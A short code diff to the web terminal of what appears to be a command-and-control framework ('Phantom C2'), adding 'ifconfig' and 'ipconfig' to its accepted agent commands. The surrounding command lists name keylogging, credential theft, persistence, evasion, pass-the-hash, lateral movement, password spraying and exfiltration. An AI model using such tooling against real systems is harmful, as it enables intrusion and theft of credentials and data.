@@ -530,7 +530,7 @@ tr.clickable { cursor: pointer; }
         <div class="term-body" id="term-body">
           <div class="term-info">Welcome to Phantom C2 Interactive Terminal</div>
           <div class="term-info">Select an agent above, then type commands below.</div>
-          <div class="term-info" style="color:var(--text-muted)">Commands: shell, sysinfo, ps, screenshot, download, persist, sleep, kill</div>
+          <div class="term-info" style="color:var(--text-muted)">Commands: shell, sysinfo, ifconfig, ps, screenshot, download, persist, sleep, kill</div>
           <div class="term-info" style="color:var(--text-muted)">          token, keylog, socks, portfwd, creds, pivot, evasion, ad-*</div>
           <div>&nbsp;</div>
         </div>
@@ -1420,7 +1420,7 @@ async function sendTermCmd() {
   let cmd = parts[0].toLowerCase(), args = parts.slice(1).join(' ');
 
   if (['shell','exec','cmd'].includes(cmd)) { cmd = 'shell'; }
-  else if (!['sysinfo','ps','screenshot','download','upload','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot','lateral','wmiexec','winrm','psexec','pth','exfil','assembly','ad','initaccess','portscan','spray','netdiscover'].includes(cmd) && !cmd.startsWith('ad-')) {
+  else if (!['sysinfo','ifconfig','ipconfig','ps','screenshot','download','upload','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot','lateral','wmiexec','winrm','psexec','pth','exfil','assembly','ad','initaccess','portscan','spray','netdiscover'].includes(cmd) && !cmd.startsWith('ad-')) {
     args = raw; cmd = 'shell';
   }
 
